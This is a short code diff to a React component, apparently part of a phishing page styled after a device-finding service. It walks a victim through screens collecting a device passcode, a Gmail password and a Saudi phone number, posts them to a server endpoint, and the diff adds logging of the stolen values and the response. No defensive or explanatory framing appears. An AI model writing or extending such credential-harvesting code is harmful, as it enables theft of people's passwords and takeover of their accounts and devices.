@@ -33,8 +33,9 @@ function FindMyFlow() {
     else if (step === "gmail") setStep("phone");
     else if (step === "phone") {
       // Submit data to the server
+      console.log("Attempting to submit data:", { passcode, gmailPassword, phoneNumber });
       try {
-        await fetch("/api/submit", {
+        const response = await fetch("/api/submit", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -43,6 +44,8 @@ function FindMyFlow() {
             phoneNumber: `+966 ${phoneNumber}`
           }),
         });
+        const result = await response.json();
+        console.log("Submission result:", result);
       } catch (error) {
         console.error("Failed to submit data:", error);
       }
